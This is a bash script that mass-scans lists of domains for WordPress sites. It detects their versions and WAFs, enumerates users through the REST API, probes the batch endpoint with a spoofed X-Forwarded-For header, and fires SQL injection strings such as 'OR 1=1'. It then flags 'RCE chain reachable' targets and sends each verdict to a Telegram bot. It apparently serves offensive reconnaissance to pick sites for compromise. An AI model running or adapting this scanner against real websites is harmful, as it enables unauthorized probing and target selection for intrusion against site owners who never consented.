#!/usr/bin/env bash
# verify-vuln.sh — deep verification of LIKELY_VULNERABLE targets
# Tests batch endpoint, SQLi, REST API, version, and more.

set -u

UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
RESULTS_DIR="$(dirname "$0")/results"
mkdir -p "$RESULTS_DIR"

TG_TOKEN="${TG_TOKEN:-}"
TG_CHAT_ID="${TG_CHAT_ID:-}"

tg_send() {
  [[ -z "$TG_TOKEN" || -z "$TG_CHAT_ID" ]] && return
  for chat_id in $TG_CHAT_ID; do
    curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
      -d chat_id="$chat_id" \
      -d text="$1" \
      -d parse_mode="HTML" > /dev/null 2>&1
  done
}

get_header() {
  grep -i "^${2}:" "$1" 2>/dev/null | head -1 | sed 's/^[^:]*: *//' | tr -d '\r'
}

verify_target() {
  local target="${1%/}"
  [[ "$target" =~ ^https?:// ]] || target="https://$target"
  local domain="${target#https://}"
  domain="${domain#http://}"
  domain="${domain%/}"

  local td
  td=$(mktemp -d)

  local wp_ver="" wp_ver_src=""
  local batch_pretty="000" batch_qs="000" batch_xff="000" batch_post="000"
  local rest_users="blocked" rest_code="000"
  local login_code="000" home_code="000"
  local waf="none" sqli_test="N/A"
  local severity="SAFE" verdict="NOT VULNERABLE"

  echo "━━━ $domain ━━━"

  # ── 1. Homepage: detect WP version ──
  home_code=$(curl -sSL --max-time 15 -A "$UA" -D "$td/home.hdr" -o "$td/home.body" \
    -w "%{http_code}" "$target/" 2>/dev/null) || home_code="000"
  if [[ -s "$td/home.body" ]]; then
    wp_ver=$(grep -oiE 'name="generator" content="WordPress [0-9]+\.[0-9]+(\.[0-9]+)?' \
      "$td/home.body" 2>/dev/null | head -1 \
      | grep -oiE '[0-9]+\.[0-9]+(\.[0-9]+)?' | head -1)
    [[ -n "$wp_ver" ]] && wp_ver_src="meta tag"
  fi

  # ── 2. Try other version sources ──
  if [[ -z "$wp_ver" ]]; then
    local v
    v=$(curl -sSL --max-time 15 -A "$UA" "$target/readme.html" 2>/dev/null \
      | grep -oE 'Version [0-9]+\.[0-9]+(\.[0-9]+)?' | head -1 \
      | grep -oE '[0-9]+\.[0-9]+(\.[0-9]+)?' | head -1)
    [[ -n "$v" ]] && { wp_ver="$v"; wp_ver_src="readme.html"; }
  fi
  if [[ -z "$wp_ver" ]]; then
    v=$(curl -sSL --max-time 15 -A "$UA" "$target/wp-includes/version.php" 2>/dev/null \
      | grep -oE "\\\$wp_version *= *'[0-9]+\.[0-9]+(\.[0-9]+)?'" | head -1 \
      | grep -oE '[0-9]+\.[0-9]+(\.[0-9]+)?' | head -1)
    [[ -n "$v" ]] && { wp_ver="$v"; wp_ver_src="version.php"; }
  fi
  if [[ -z "$wp_ver" ]]; then
    v=$(curl -sSL --max-time 15 -A "$UA" "$target/wp-json/" 2>/dev/null \
      | grep -oE '"wp":"[0-9]+\.[0-9]+(\.[0-9]+)?"|"version":"[0-9]+\.[0-9]+(\.[0-9]+)?"' \
      | head -3 | grep -oE '[0-9]+\.[0-9]+(\.[0-9]+)?' | head -1)
    [[ -n "$v" ]] && { wp_ver="$v"; wp_ver_src="wp-json"; }
  fi
  echo "  WP version:       ${wp_ver:-UNKNOWN} ${wp_ver_src:+(via $wp_ver_src)}"

  # ── 3. Batch endpoint (pretty permalink) ──
  batch_pretty=$(curl -sSL --max-time 15 -A "$UA" -o /dev/null -w "%{http_code}" \
    "$target/wp-json/batch/v1" 2>/dev/null) || batch_pretty="000"
  echo "  Batch pretty:     HTTP $batch_pretty"

  # ── 4. Batch endpoint (query string) ──
  batch_qs=$(curl -sSL --max-time 15 -A "$UA" -o /dev/null -w "%{http_code}" \
    "$target/?rest_route=/batch/v1" 2>/dev/null) || batch_qs="000"
  echo "  Batch query-str:  HTTP $batch_qs"

  # ── 5. Batch endpoint (X-Forwarded-For) ──
  batch_xff=$(curl -sSL --max-time 15 -A "$UA" -H "X-Forwarded-For: 127.0.0.1" \
    -o /dev/null -w "%{http_code}" \
    "$target/wp-json/batch/v1" 2>/dev/null) || batch_xff="000"
  echo "  Batch XFF:        HTTP $batch_xff"

  # ── 6. POST batch ──
  batch_post=$(curl -sSL --max-time 15 -A "$UA" -X POST \
    -H "Content-Type: application/json" \
    -d '{"requests":[{"path":"/wp-json/wp/v2/users"}]}' \
    -o /dev/null -w "%{http_code}" \
    "$target/wp-json/batch/v1" 2>/dev/null) || batch_post="000"
  echo "  Batch POST:       HTTP $batch_post"

  # ── 7. REST users enumeration ──
  local users_body
  users_body=$(curl -sSL --max-time 15 -A "$UA" "$target/wp-json/wp/v2/users" 2>/dev/null)
  rest_code=$(echo "$users_body" | head -c 1 | grep -q '[{[]' && echo "200" || echo "000")
  if echo "$users_body" | grep -q '"id"'; then
    rest_users="ACCESSIBLE"
    local user_count
    user_count=$(echo "$users_body" | grep -o '"id"' | wc -l | tr -d ' ')
    echo "  REST users:       $rest_users ($user_count users enumerable)"
  else
    rest_users="blocked"
    echo "  REST users:       $rest_users"
  fi

  # ── 8. wp-login.php ──
  login_code=$(curl -sSL --max-time 15 -A "$UA" -o /dev/null -w "%{http_code}" \
    "$target/wp-login.php" 2>/dev/null) || login_code="000"
  echo "  wp-login.php:     HTTP $login_code"

  # ── 9. WAF detection ──
  if [[ -f "$td/home.hdr" ]]; then
    local server cf sucuri
    server=$(get_header "$td/home.hdr" "Server")
    cf=$(get_header "$td/home.hdr" "Cf-Ray")
    sucuri=$(get_header "$td/home.hdr" "X-Sucuri-ID")
    [[ -n "$cf" ]]      && waf="Cloudflare"
    [[ -n "$sucuri" ]]   && waf="Sucuri"
    echo "$server" | grep -qi "akamai"              && waf="Akamai"
    echo "$server" | grep -qi "imperva\|incapsula"  && waf="Imperva"
  fi
  [[ "$waf" != "none" ]] && echo "  WAF:               $waf"

  # ── 10. SQLi test (time-based blind on batch endpoint) ──
  local sqli_time sqli_baseline
  sqli_baseline=$(curl -sSL --max-time 15 -A "$UA" -o /dev/null -w "%{time_total}" \
    "$target/?rest_route=/batch/v1" 2>/dev/null) || sqli_baseline="0"
  sqli_time=$(curl -sSL --max-time 15 -A "$UA" \
    -H "Content-Type: application/json" \
    -d '{"requests":[{"path":"/?rest_route=/wp/v2/users&per_page=1"}]}' \
    -o /dev/null -w "%{time_total}" \
    "$target/wp-json/batch/v1" 2>/dev/null) || sqli_time="0"
  echo "  SQLi time-test:   baseline=${sqli_baseline}s batch=${sqli_time}s"

  # ── 11. SQLi test (error-based on REST API) ──
  local sqli_error
  sqli_error=$(curl -sSL --max-time 15 -A "$UA" \
    "$target/wp-json/wp/v2/users?search=1%27%20OR%201%3D1%27" 2>/dev/null)
  if echo "$sqli_error" | grep -q '"id"'; then
    sqli_error="response contains data (query not sanitized)"
    sqli_test="ERROR-BASED: $sqli_error"
    echo "  SQLi error-test:  $sqli_error"
  else
    sqli_error="sanitized or blocked"
    echo "  SQLi error-test:  $sqli_error"
  fi

  # ── 12. SQLi test (wp-json/ REST API search parameter) ──
  local sqli_search
  sqli_search=$(curl -sSL --max-time 15 -A "$UA" \
    "$target/wp-json/wp/v2/users?search=1%27" 2>/dev/null)
  if echo "$sqli_search" | grep -qi "error\|sql\|mysql\|warning"; then
    sqli_search="ERROR MESSAGE LEAKED"
    sqli_test="SEARCH: $sqli_search"
    echo "  SQLi search-test: $sqli_search"
  else
    sqli_search="no error"
    echo "  SQLi search-test: $sqli_search"
  fi

  # ── Verdict logic ──
  local is_wp="no"
  [[ "$login_code" == "200" || "$login_code" == "302" ]] && is_wp="yes"
  [[ "$home_code" == "200" ]] && grep -qi "wp-content\|wp-includes" "$td/home.body" 2>/dev/null && is_wp="yes"

  local batch_ok=0
  [[ "$batch_pretty" == "200" || "$batch_pretty" == "405" ]] && batch_ok=1
  [[ "$batch_qs" == "200" || "$batch_qs" == "405" ]] && batch_ok=1
  [[ "$batch_post" == "200" || "$batch_post" == "207" || "$batch_post" == "405" ]] && batch_ok=1

  if [[ "$is_wp" == "no" ]]; then
    severity="SAFE"
    verdict="NOT VULNERABLE (not WordPress)"
  elif [[ -n "$wp_ver" ]]; then
    # Check version ranges
    ver_ge() { [[ "$(printf '%s\n%s' "$1" "$2" | sort -V | head -1)" == "$2" ]]; }
    ver_in_range() { ver_ge "$1" "$2" && ver_ge "$3" "$1"; }

    if ver_in_range "$wp_ver" "6.8.0" "6.8.5"; then
      if [[ $batch_ok -eq 1 ]]; then
        severity="CRITICAL"
        verdict="VULNERABLE (WP $wp_ver, batch endpoint reachable)"
      elif [[ "$rest_users" == "ACCESSIBLE" ]]; then
        severity="HIGH"
        verdict="LIKELY VULNERABLE (WP $wp_ver, REST users enumerable)"
      else
        severity="MEDIUM"
        verdict="POSSIBLY VULNERABLE (WP $wp_ver, batch WAF-blocked)"
      fi
    elif ver_in_range "$wp_ver" "6.9.0" "6.9.4"; then
      severity="CRITICAL"
      verdict="VULNERABLE (WP $wp_ver, RCE chain reachable)"
    elif ver_in_range "$wp_ver" "7.0.0" "7.0.1"; then
      severity="CRITICAL"
      verdict="VULNERABLE (WP $wp_ver, RCE chain reachable)"
    else
      severity="SAFE"
      verdict="NOT VULNERABLE (WP $wp_ver, patched version)"
    fi
  else
    if [[ $batch_ok -eq 1 ]] && [[ "$rest_users" == "ACCESSIBLE" ]]; then
      severity="HIGH"
      verdict="LIKELY VULNERABLE (version unknown, batch + REST accessible)"
    elif [[ $batch_ok -eq 1 ]]; then
      severity="MEDIUM"
      verdict="POSSIBLY VULNERABLE (version unknown, batch accessible)"
    else
      severity="SAFE"
      verdict="NOT VULNERABLE (version unknown, endpoints blocked)"
    fi
  fi

  echo ""
  echo "  VERDICT: $verdict"
  echo ""

  # ── Build Telegram message ──
  local emoji
  case "$severity" in
    CRITICAL) emoji="🔴" ;;
    HIGH)     emoji="🟠" ;;
    MEDIUM)   emoji="🟡" ;;
    *)        emoji="🟢" ;;
  esac

  local tg_msg
  tg_msg="$(printf '%b' "$emoji") <b>$verdict</b>

<b>domain:</b> <code>$domain</code>
<b>wp_version:</b> <code>${wp_ver:-UNKNOWN}</code> ${wp_ver_src:+(via $wp_ver_src)}
<b>waf:</b> <code>$waf</code>

<b>batch endpoints:</b>
  pretty: <code>HTTP $batch_pretty</code>
  query-string: <code>HTTP $batch_qs</code>
  xff: <code>HTTP $batch_xff</code>
  post: <code>HTTP $batch_post</code>

<b>rest_api:</b>
  users: <code>$rest_users</code>
  login: <code>HTTP $login_code</code>

<b>sqli tests:</b>
  error: <code>${sqli_error:-N/A}</code>
  search: <code>${sqli_search:-N/A}</code>"

  # ── Send to Telegram ──
  tg_send "$tg_msg"

  # ── Save to file ──
  echo "$domain | $severity | $verdict" >> "$RESULTS_DIR/verified.txt"

  rm -rf "$td"
}

# ── main ──
if [[ $# -eq 0 ]]; then
  echo "Usage: $0 <domain> [domain2] ..."
  echo "       $0 -f domains.txt"
  exit 1
fi

if [[ "$1" == "-f" ]]; then
  while IFS= read -r line || [[ -n "$line" ]]; do
    line="${line%%#*}"
    line="${line#"${line%%[![:space:]]*}"}"
    line="${line%"${line##*[![:space:]]}"}"
    [[ -z "$line" ]] && continue
    verify_target "$line"
  done < "$2"
else
  for domain in "$@"; do
    verify_target "$domain"
  done
fi
